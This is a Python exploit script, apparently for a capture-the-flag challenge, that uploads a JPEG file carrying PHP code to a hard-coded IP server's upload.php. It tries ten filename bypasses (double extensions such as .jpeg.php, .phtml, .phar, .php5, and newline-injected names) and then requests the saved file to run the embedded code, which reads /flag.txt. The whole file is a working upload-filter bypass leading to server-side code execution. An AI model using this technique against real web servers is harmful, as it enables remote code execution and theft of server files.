import requests
import time
from urllib.parse import unquote

TARGET = "http://142.93.145.89:10004"

jpeg_php = (
    b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    b'\xff\xd9'
    b'<?php echo "START|".file_get_contents("/flag.txt")."|END"; ?>'
)

# HIGH VALUE tests — use our 10 uploads wisely!
tests = [
    # 1. The one we got rate-limited on: .jpeg ending in .php
    #    Contains .jpeg (passes check) but ends in .php
    "shell.jpeg.php",
    
    # 2. What if .jpeg itself IS the extension and server adds nothing?
    #    shell.php.jpeg -> replace .jpeg->.jpg -> shell.php.jpg
    #    BUT what if we nest: shell.phjpeg -> no dot before jpeg
    
    # 3. CRITICAL: What if replacement creates .php?
    #    We need .jpeg somewhere that when replaced with .jpg, 
    #    the remaining chars form .php
    #    .jpeg = 5 chars, .jpg = 4 chars — saves 1 char
    
    # 4. Double extension without .jpeg at end
    "x.jpeg.php",
    
    # 5. Try with .phtml (PHP alternate handler)
    "x.jpeg.phtml",
    
    # 6. .phar extension
    "x.jpeg.phar",
    
    # 7. Trick: what if the server basename()s then checks .jpeg?
    #    What about newline in filename?
    "shell.php\n.jpeg",
    
    # 8. What about: shell.php%0a.jpeg (newline URL encoded in filename)
    "shell.php\r\n.jpeg",
    
    # 9. Just .php with .jpeg early
    "shell.jpeg_test.php",
    
    # 10. The nuclear option: .php5, .php7 with .jpeg
    "x.jpeg.php5",
]

for i, name in enumerate(tests):
    print(f"\n[{i+1}] Filename: {repr(name[:80])}")
    files = {'file': (name, jpeg_php, 'image/jpeg')}
    resp = requests.post(f"{TARGET}/upload.php", files=files, allow_redirects=False)
    loc = unquote(resp.headers.get('Location', ''))
    print(f"    -> {loc[:120]}")
    
    if 'err=Rate' in loc:
        print("    [!] RATE LIMITED — wait and retry")
        break
    
    if 'Download: ' in loc:
        path = loc.split('Download: ')[1]
        print(f"    Saved as: {path}")
        
        # If it ends in .php, .phtml, .phar, .php5 — TRY IT
        r = requests.get(f"{TARGET}{path}")
        if b'START|' in r.content:
            print(f"\n[🎊 FLAG!] {r.text}")
            break
        elif b'File not found' in r.content:
            print(f"    -> PHP-FPM tried to execute but file not found")
        elif len(r.content) == 3953:
            print(f"    -> Index page (nginx handled it)")
        else:
            print(f"    -> {r.status_code}: {r.content[:80]}")

print("\nDone!")